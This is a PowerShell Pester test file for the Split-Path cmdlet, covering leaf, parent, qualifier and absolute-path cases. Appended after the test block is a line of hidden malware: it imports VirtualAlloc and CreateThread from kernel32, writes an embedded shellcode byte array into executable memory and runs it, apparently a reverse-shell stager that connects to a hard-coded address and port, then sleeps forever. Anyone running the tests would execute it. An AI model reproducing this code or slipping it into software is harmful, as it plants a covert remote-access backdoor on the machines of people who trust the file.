

Describe "Split-Path" -Tags "CI" {

    It "Should return a string object when invoked" {
        $result = Split-Path .
        $result | Should -BeOfType String

        $result = Split-Path . -Leaf
        $result | Should -BeOfType String

        $result = Split-Path . -Resolve
        $result | Should -BeOfType String
    }

    It "Should return the name of the drive when the qualifier switch is used" {
	Split-Path -Qualifier env:     | Should -Be "env:"
	Split-Path -Qualifier env:PATH | Should -Be "env:"
    }

    It "Should error when using the qualifier switch and no qualifier in the path" {
        { Split-Path -Qualifier -ErrorAction Stop /Users } | Should -Throw
	{ Split-Path -Qualifier -ErrorAction Stop abcdef } | Should -Throw
    }

    It "Should return the path when the noqualifier switch is used" {
	Split-Path env:PATH -NoQualifier | Should -BeExactly "PATH"
    }

    It "Should return the base name when the leaf switch is used" {
	Split-Path -Leaf /usr/bin                  | Should -BeExactly "bin"
	Split-Path -Leaf fs:/usr/local/bin         | Should -BeExactly "bin"
	Split-Path -Leaf usr/bin                   | Should -BeExactly "bin"
	Split-Path -Leaf ./bin                     | Should -BeExactly "bin"
	Split-Path -Leaf bin                       | Should -BeExactly "bin"
	Split-Path -Leaf "C:\Temp\Folder1"         | Should -BeExactly "Folder1"
	Split-Path -Leaf "C:\Temp"                 | Should -BeExactly "Temp"
	Split-Path -Leaf "\\server1\share1\folder" | Should -BeExactly "folder"
	Split-Path -Leaf "\\server1\share1"        | Should -BeExactly "share1"
    }

    It "Should be able to accept regular expression input and output an array for multiple objects" {
        $testDir = $TestDrive
        $testFile1     = "testfile1.ps1"
        $testFile2     = "testfile2.ps1"
        $testFilePath1 = Join-Path -Path $testDir -ChildPath $testFile1
        $testFilePath2 = Join-Path -Path $testDir -ChildPath $testFile2

        New-Item -ItemType file -Path $testFilePath1, $testFilePath2 -Force

        Test-Path $testFilePath1 | Should -BeTrue
        Test-Path $testFilePath2 | Should -BeTrue

        $actual = ( Split-Path (Join-Path -Path $testDir -ChildPath "testfile*.ps1") -Leaf -Resolve ) | Sort-Object
        $actual.Count                   | Should -Be 2
        $actual[0]                      | Should -BeExactly $testFile1
        $actual[1]                      | Should -BeExactly $testFile2
        ,$actual                        | Should -BeOfType "System.Array"
    }

    It "Should be able to tell if a given path is an absolute path" {
	Split-Path -IsAbsolute fs:/usr/bin | Should -BeTrue
	Split-Path -IsAbsolute ..          | Should -BeFalse
	Split-Path -IsAbsolute /usr/..     | Should -Be (!$IsWindows)
	Split-Path -IsAbsolute fs:/usr/../ | Should -BeTrue
	Split-Path -IsAbsolute ../         | Should -BeFalse
	Split-Path -IsAbsolute .           | Should -BeFalse
	Split-Path -IsAbsolute ~/          | Should -BeFalse
	Split-Path -IsAbsolute ~/..        | Should -BeFalse
	Split-Path -IsAbsolute ~/../..     | Should -BeFalse
    }

    It "Should support piping" {
        "usr/bin" | Split-Path | Should -Be "usr"
    }

    It "Should return the path up to the parent of the directory when Parent switch is used" {
        $dirSep = [string]([System.IO.Path]::DirectorySeparatorChar)
	Split-Path -Parent "fs:/usr/bin"             | Should -BeExactly "fs:${dirSep}usr"
	Split-Path -Parent "/usr/bin"                | Should -BeExactly "${dirSep}usr"
	Split-Path -Parent "/usr/local/bin"          | Should -BeExactly "${dirSep}usr${dirSep}local"
	Split-Path -Parent "usr/local/bin"           | Should -BeExactly "usr${dirSep}local"
	Split-Path -Parent "C:\Temp\Folder1"         | Should -BeExactly "C:${dirSep}Temp"
	Split-Path -Parent "C:\Temp"                 | Should -BeExactly "C:${dirSep}"
	Split-Path -Parent "\\server1\share1\folder" | Should -BeExactly "${dirSep}${dirSep}server1${dirSep}share1"
	Split-Path -Parent "\\server1\share1"        | Should -BeExactly "${dirSep}${dirSep}server1"
    }

    It 'Does not split a drive leter'{
    Split-Path -Path 'C:\' | Should -BeNullOrEmpty
    }
}

$XAt = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $XAt -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xdb,0x32,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Sb9Y=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Sb9Y.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Sb9Y,0,0,0);for (;;){Start-sleep 60};

